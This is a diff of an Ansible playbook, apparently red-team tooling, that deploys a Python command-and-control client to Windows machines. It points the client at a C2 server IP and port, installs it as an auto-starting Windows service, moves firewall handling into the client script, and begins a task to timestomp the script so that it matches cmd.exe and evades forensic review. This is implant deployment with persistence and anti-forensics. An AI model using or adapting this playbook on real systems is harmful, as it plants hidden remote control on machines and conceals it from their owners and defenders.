@@ -20,11 +20,42 @@
     src: "files/client.py"
     dest: "{{ pyc2_client_location_win }}"
 
-- name: Update users list in the script
-  win_lineinfile:
+# Need to do this as separate tasks
+- name: Update server IP
+  replace:
     path: "{{ pyc2_client_location_win }}"
-    regexp: '^users=.*'
-    line: 'users="{{ doubletap_users }}"'
+    regexp: '^SERVER=.*'
+    replace: 'SERVER="{{ pyc2_server }}"'
+
+- name: Update server port
+  replace:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^SERVER_PORT=.*'
+    replace: 'SERVER_PORT={{ pyc2_port }}'
+
+- name: Update server port range
+  replace:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^PORT_RADIUS=.*'
+    replace: 'PORT_RADIUS={{ pyc2_port_range }}'
+
+- name: Update firewall name
+  replace:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^FIREWALL_NAME=.*'
+    replace: 'FIREWALL_NAME="{{ pyc2_firewall_name }}"'
+
+- name: Update DEBUG value
+  replace:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^DEBUG=.*'
+    replace: 'DEBUG={{ pyc2_debug }}'
+
+- name: Update BUFFER value
+  replace:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^BUFFER_SIZE=.*'
+    replace: 'BUFFER_SIZE={{ pyc2_buffer_size }}'
 
 - name: Create the Windows service using PowerShell
   win_shell: |
@@ -48,25 +79,26 @@
     state: started
     start_mode: auto
 
-- name: Allow inbound traffic on port through Windows firewall
-  win_firewall_rule:
-    name: "{{ pyc2_firewall_name }}"
-    enable: yes
-    direction: in
-    localport: any
-    remoteport: "{{ pyc2_port }}"
-    protocol: TCP
-    action: allow
+# Firewall handled in client script
+#- name: Allow inbound traffic on port through Windows firewall
+#  win_firewall_rule:
+#    name: "{{ pyc2_firewall_name }}"
+#    enable: yes
+#    direction: in
+#    localport: any
+#    remoteport: "{{ pyc2_port }}"
+#    protocol: TCP
+#    action: allow
 
-- name: Allow outbound traffic on port through Windows firewall
-  win_firewall_rule:
-    name: "{{ pyc2_firewall_name }}"
-    enable: yes
-    direction: out
-    localport: any
-    remoteport: "{{ pyc2_port }}"
-    protocol: TCP
-    action: allow
+#- name: Allow outbound traffic on port through Windows firewall
+#  win_firewall_rule:
+#    name: "{{ pyc2_firewall_name }}"
+#    enable: yes
+#    direction: out
+#    localport: any
+#    remoteport: "{{ pyc2_port }}"
+#    protocol: TCP
+#    action: allow
 
 - name: Timestomp script to match cmd.exe
   win_shell: |
